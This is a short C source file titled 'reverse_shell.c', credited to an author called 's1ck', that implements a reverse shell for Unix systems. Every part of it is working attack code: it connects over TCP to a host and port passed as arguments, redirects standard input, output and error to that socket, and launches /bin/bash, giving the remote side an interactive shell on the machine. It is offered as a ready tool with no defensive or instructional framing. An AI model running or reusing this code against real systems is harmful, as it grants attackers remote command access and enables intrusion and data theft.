/*
reverse_shell.c

Author: s1ck

Description: simple reverse shell for unix based environments.

extra: uses TCP+Ipv4 connection
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <netinet/in.h>
#include <netdb.h>

void error(char* msg){
    perror(msg);
    _exit(1);
}

int main(int argc, char* argv[]){

    int server_fd,port,n;
    struct sockaddr_in server_addr;
    struct hostent* server;

    if (argc<3){
        fprintf(stderr,"usage: %s hostname port\n",argv[0]);
        _exit(0);
    }

    server_fd = socket(AF_INET,SOCK_STREAM,0);


    if (server_fd < 0){
        error("ERROR opening socket");
    }

    bzero((char *)&server_addr,sizeof(server_addr));


    server = gethostbyname(argv[1]);

    port = atoi(argv[2]);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    bcopy((char*)server->h_addr,(char *)&server_addr.sin_addr.s_addr, server->h_length);


    if (connect(server_fd,(struct sockaddr*)&server_addr, sizeof(server_addr)) < 0){
        error("ERROR connecting");
    }

    write(server_fd,"sending shell!...\n",18);

    dup2(server_fd,0);
    dup2(server_fd,1);
    dup2(server_fd,2);

    execve("/bin/bash",NULL,NULL);


    return 0;
}
